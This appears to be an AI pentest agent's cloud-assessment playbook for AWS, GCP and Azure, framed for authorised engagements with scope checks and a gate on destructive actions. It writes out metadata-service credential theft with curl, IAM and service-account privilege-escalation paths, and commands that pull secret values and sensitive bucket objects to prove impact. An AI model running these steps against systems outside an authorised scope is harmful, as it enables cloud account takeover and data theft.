---
name: playbook-cloud
description: Cloud security playbook — AWS/GCP/Azure attack chains from any credential or metadata foothold to proven impact (IAM privesc, role chaining, storage exfil, secrets). Load when the target is a cloud environment or you obtain cloud creds/metadata/tokens. Triggers - AWS/GCP/Azure, IAM role/policy, S3/blob/bucket, 169.254.169.254 metadata, access key, assume-role, actAs, managed identity, key vault, STS token, cloud console.
tags: [playbook, cloud]
---

# Cloud Security Assessment Playbook

## Entry rules (every cloud engagement)
1. `scope_check` the account IDs / project IDs / tenant domain BEFORE touching anything. Cloud scope is contract-scoped, not IP-scoped.
2. Every confirmed finding → `state_update` immediately (vuln + evidence + credential record with the token's identity and expiry).
3. DESTRUCTIVE GATE: never `terminate`, `delete`, `put-bucket-policy` on shared resources, rotate keys, or modify IAM. Read-only enumeration + non-destructive proof actions only unless the operator explicitly unlocks it (`phase_control`).
4. Log noise is real: every API call is recorded (CloudTrail/audit logs). Volume discipline — prefer single targeted calls over `*` list-everything sweeps when the target monitors.

## When this fires
You have ANY of: access key pair, STS/session token, metadata service reach from a workload, OAuth token for ARM/GCP APIs, console creds, or an SSRF that can hit IMDS. Goal is always the same chain: identify identity → enumerate permissions → find escalation or lateral path → PROVE impact with one concrete read.

## Identity bootstrap (first 5 commands, any cloud)
```bash
# AWS — who am I, what account
aws sts get-caller-identity
# GCP
gcloud auth list && gcloud config get-value project
gcloud iam service-accounts get-iam-policy <SA>@<proj>.iam.gserviceaccount.com
# Azure — token + subscriptions
az account show --query "{tenantId:tenantId,user:user.name,subscriptions:[].id}"
```
Record the returned identity in `state_update` as a Credential entry (type: cloud-token) BEFORE escalating. If `get-caller-identity` fails with an expired-token error, the credential is dead — say so, don't retry-loop.

## AWS

### Detect & enumerate
```bash
# Unauthenticated surface
aws s3 ls s3://<company>-<env> --no-sign-request          # bucket name guessing
aws s3 ls s3://<bucket> --no-sign-request --recursive
aws ec2 describe-snapshots --owner-ids <account_id> --filters Name=status,Values=completed --region <region>

# Authenticated permission map (do these in order)
aws iam list-attached-user-policies --user-name <user>
aws iam get-policy-version --policy-arn <arn> --version-id v1   # read the Actual document
aws iam list-roles --query "Roles[?AssumeRolePolicyDocument]" # who trusts whom
aws ec2 describe-instances --region <region>           # instance profiles = roles to steal
aws lambda list-functions --region <region>            # env vars hold secrets
aws secretsmanager list-secrets --region <region>
aws rds describe-db-instances --region <region>

# From a compromised EC2 — steal the instance role
curl -s http://169.254.169.254/latest/api/token -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"   # IMDSv2
curl -s -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
curl -s -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/user-data    # startup scripts leak secrets
```
IMDSv1 (no token step) still working = itself a Medium finding (state_update it).

### Escalation decision table (check in this order — highest hit-rate first)
| Permission held | Move | Why it wins |
|---|---|---|
| `iam:CreatePolicyVersion` (+`SetAsDefault`) | overwrite own policy with admin | direct, no other principal needed |
| `iam:AttachUserPolicy` / `PutUserPolicy` | attach AdministratorAccess to self | direct |
| `iam:PassRole` + (`lambda:CreateFunction`\|`ec2:RunInstances`\|`cloudformation:CreateStack`) | run code AS a privileged role | most common real-world path |
| `sts:AssumeRole` on any role in list-roles | pivot; re-run table for new role | chaining engine |
| `lambda:UpdateFunctionCode` on existing fn | inject code into already-privileged runtime | no PassRole needed |
| `glue:CreateDevEndpoint` / `sagemaker:CreateNotebookInstance` (+PassRole) | jupyter/shell as role | obscure but reliable |
| `codebuild:CreateProject` (+PassRole) | build spec = shell as role | same pattern |
| `ec2:ModifyInstanceAttribute` + `iam:PassRole` | swap role on STOPPED instance you control | two-step |
| `dynamodb:`/`s3:` read on state buckets | terraform tfstate = plaintext secrets | escalation by reading, not permissions |

After EVERY assumed role: re-run `sts get-caller-identity` + policy read. Chain until admin OR loop detected (track visited roles in your notes — role loops waste dozens of calls).

### PROVE IMPACT (AWS)
- Bucket: download ONE sensitive real object (customer file, backup, cred file) — name it in evidence. Listing alone ≠ impact.
- Role escalation: `aws sts get-caller-identity` output showing the escalated ARN + one privileged action actually performed (e.g., read a secret).
- Secrets: retrieve ONE secret value via `secretsmanager get-secret-value`. Redact half the value in the report; store full hash in evidence.
- Snapshot: share-to-self is MODIFICATION (destructive gate) — instead prove readability of an unencrypted public snapshot by describing it + noting encrypted=false and size/content-type signals.

## GCP

### Detect & enumerate
```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token   # steal SA token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
gcloud projects list                                   # all projects token can see
gcloud compute instances list --project <p>            # scopes column = what each VM's SA holds
gcloud storage ls --project <p>                        # buckets
gcloud secrets versions list <secret> --project <p>
gcloud iam service-accounts list --project <p>
```

### Escalation logic (GCP is `actAs`-centric)
- Hold `iam.serviceAccounts.actAs` on a powerful SA + any resource-create perm (`compute.instances.create`, `cloudfunctions.functions.create`, `run.services.create`) → create resource AS that SA → metadata steal its token.
- `iam.serviceAccountKeys.create` on a target SA → mint downloadable key (LOUD — log-visible; prefer actAs path when both exist).
- Default compute SA with `cloud-platform` scope = instant broad compromise from any instance metadata.
- Custom roles: `gcloud iam roles list --project <p>` — decode the actual permissions, don't trust names.
- Org-level: `gcloud asset search-all-resources --scope=organizations/<org>` if token reaches — one call maps everything (also LOUD).

### PROVE IMPACT (GCP)
- One secret value read (`gcloud secrets versions access latest --secret=<s>`).
- One bucket object downloaded from a data bucket.
- SA impersonation: show the minted token's `email` claim matching the privileged SA + one API call made as it.

## Azure / Entra ID

### Detect & enumerate
```bash
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"     # MSI token
az login --identity                                                # from compromised VM, uses MSI
az account list --output table
az vm list --output table && az webapp list --output table
az keyvault list --output table                                    # then per-vault access check
az keyvault secret list --vault-name <v>
az ad signed-in-user show                                          # identity + display name
az role assignment list --assignee <me-or-msi-id> --include-inherited --output table
az ad app list --output table                                      # app regs: client secrets in manifests
```

### Escalation logic (Azure)
- Managed Identity with Contributor on its own resource group or subscription → `az login --identity` → deploy/modify anything there; pull Key Vault if the MI has `get` on secrets.
- Key Vault access policy `get` on Secrets → dump secrets (connection strings = DB pivot → link database skill).
- Entra directory roles: `Global Reader` alone proves tenant-wide visibility (report); `User Administrator`/`Application Administrator` → add creds to principals/apps → impersonation.
- App registrations with `RoleManagement.ReadWrite.Directory` + owned app creds → grant app directory role = Global Admin path (LOUD, gate behind operator).
- Automation Accounts / Logic Apps / Functions: app settings = plaintext secrets, runbooks = code-exec as MI.
- `.azure` dir on compromised dev boxes: `azureProfile.json` + `accessTokens.json` = ready tokens.

### PROVE IMPACT (Azure)
- One Key Vault secret VALUE retrieved (name alone isn't impact).
- One blob downloaded from a data container (`az storage blob download`).
- MI abuse: token audience + role assignment shown + one management action performed (e.g., list another RG's resources).

## Containers-on-cloud quick hits (EKS/GKE/AKS)
- EKS: stolen node role → `eks:DescribeCluster` gives endpoint+CA → if auth map allows `system:masters` for that role (legacy launch templates) = cluster-admin. Check ConfigMaps `aws-auth`.
- GKE: SA with `container.clusters.get` → pull cluster creds `gcloud container clusters get-credentials` → check own RBAC inside.
- AKS: MI with `Kubernetes Cluster Admin Role` (Azure RBAC) or kubeconfig on disk in App Service `/home/.kube`.

## Cross-cloud checks (always run once)
- Hardcoded credentials in repos/CI configs/pipeline variables (link cicd skill).
- Public storage sweep: S3 naming-pattern guesses, GCS, Blob anonymous GET.
- Logging gaps: CloudTrail multi-region off, GCP audit log exclusions, Activity Log retention <90d — report as hygiene findings.
- MFA absent on break-glass/admin accounts (console-visible only; note if unverifiable).

## Tooling integration
- `nmap_parse`/web tools found the initial foothold; cloud work is `shell`-driven CLI.
- `state_update`: record each credential/token as Credential (mark expiry!), each misconfig as Vulnerability (severity by data sensitivity, NOT by CVE-style thinking), each proven read as Evidence with the redacted value hash.
- `attack_path_suggest` after ≥2 nodes mapped — cloud role-chains map cleanly onto its graph.
- SSRF found by web tooling → IMMEDIATELY probe IMDS variants (link ssrf skill): v1/v2, GCP header-required, Azure `Metadata: true`. Metadata reach = cloud creds = this playbook.

## Pitfalls (false confidence generators)
- Region mismatch: `aws ... --region us-east-1` failing on resources in eu-west-1 looks EXACTLY like no-permission. Always retry errors once with the right region before concluding denied.
- Expired tokens fail with misleading messages; check `Expiration` field on STS creds first when anything 403s.
- `list` succeeding ≠ `get` allowed — proving impact needs the actual READ, policies differ per-action.
- GCP `--project` flag forgotten → error reads like permission denial.
- Dry-run first where supported (`--dry-run` on aws ec2 mutations) even inside the gate — free permission probe.
- Deny-by-default noise: one 403 doesn't mean the identity is useless; it means THAT action. Keep enumerating breadth-first.
